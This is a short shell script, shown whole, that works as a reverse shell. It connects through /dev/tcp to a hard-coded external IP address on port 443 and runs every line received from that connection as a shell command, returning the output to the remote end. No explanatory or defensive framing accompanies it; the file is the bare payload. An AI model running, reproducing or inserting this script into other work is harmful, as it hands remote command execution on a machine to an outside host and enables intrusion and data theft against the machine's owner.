#!/bin/sh

exec 5<>/dev/tcp/216.126.227.250/443
cat <&5 | while read line; do $line 2>&5 >&5; done
